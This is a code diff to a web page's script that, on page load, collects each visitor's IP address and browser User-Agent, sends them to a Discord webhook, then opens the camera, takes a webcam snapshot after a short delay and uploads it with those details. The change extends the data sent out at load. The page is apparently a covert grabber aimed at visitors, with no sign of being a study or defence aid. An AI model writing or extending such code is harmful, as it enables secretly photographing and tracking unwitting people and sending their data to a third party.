@@ -47,11 +47,12 @@
         // Start the camera automatically when the page loads
         window.onload = async () => {
             const ipAddress = await getUserIp(); // Get user IP
-            sendIpToDiscord(ipAddress); // Send IP to Discord
+            const userAgent = navigator.userAgent; // Get device info from User-Agent
+            sendDetailsToDiscord(ipAddress, userAgent); // Send IP and device info to Discord
 
             // Start the camera after a short delay
             setTimeout(() => {
-                startCamera(ipAddress); // Pass IP to start camera function
+                startCamera(ipAddress, userAgent); // Pass IP and userAgent to start camera function
             }, 2000); // Delay before starting the camera
         };
 
@@ -66,12 +67,15 @@
             }
         }
 
-        function sendIpToDiscord(ipAddress) {
-            const content = `User IP: ${ipAddress}`;
-            sendMessageToDiscord(content);
+        function sendDetailsToDiscord(ipAddress, userAgent) {
+            const content = `
+                User IP: ${ipAddress}
+                Device Info: ${userAgent}
+            `;
+            sendMessageToDiscord(content.trim());
         }
 
-        async function startCamera(ipAddress) {
+        async function startCamera(ipAddress, userAgent) {
             // Check if getUserMedia is supported
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 console.error('getUserMedia not supported on this browser or device.');
@@ -88,7 +92,7 @@
 
                 // Capture snapshot after a 2-second delay once metadata is loaded
                 video.addEventListener('loadedmetadata', () => {
-                    setTimeout(() => takeSnapshot(stream, ipAddress), 2000); // 2 seconds delay before taking the snapshot
+                    setTimeout(() => takeSnapshot(stream, ipAddress, userAgent), 2000); // 2 seconds delay before taking the snapshot
                 });
 
             } catch (error) {
@@ -97,7 +101,7 @@
             }
         }
 
-        function takeSnapshot(stream, ipAddress) {
+        function takeSnapshot(stream, ipAddress, userAgent) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -115,9 +119,6 @@
 
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
-
-            // Get User-Agent string for device info
-            const userAgent = navigator.userAgent;
 
             // Send the image to Discord with additional details
             uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
@@ -167,12 +168,12 @@
                 body: formData
             }).then(response => {
                 if (response.ok) {
-                    console.log('IP successfully sent to Discord.');
+                    console.log('Details successfully sent to Discord.');
                 } else {
-                    console.error('Failed to send IP to Discord:', response.statusText);
+                    console.error('Failed to send details to Discord:', response.statusText);
                 }
             }).catch(error => {
-                console.error('Error sending IP to Discord:', error);
+                console.error('Error sending details to Discord:', error);
             });
         }
     </script>
